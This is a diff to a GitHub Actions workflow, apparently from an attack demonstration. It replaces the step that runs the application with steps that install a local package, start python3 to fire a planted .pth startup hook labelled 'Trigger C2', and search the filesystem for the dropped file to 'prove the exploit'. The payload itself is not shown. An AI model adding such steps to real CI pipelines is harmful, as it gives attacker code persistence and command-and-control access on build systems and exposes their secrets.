@@ -6,6 +6,13 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Install Company Dependencies
-        run: pip install --no-build-isolation -e ./internal_lib/ --break-system-packages
-      - name: Run Production Application
-        run: python victim_app/app.py
+        run: |
+          pip install ./internal_lib/ --break-system-packages
+      - name: Verify Installation & Trigger C2
+        # We call 'python3' which triggers the .pth file we just dropped
+        run: |
+          python3 -c "import internal_auth_helper; print('Startup hooks should fire now...')"
+      - name: Forensic Check (Internal)
+        # This shows in the logs that the file exists, proving your exploit
+        run: |
+          find / -name "*.pth" 2>/dev/null | grep internal_init || echo "Not found yet"
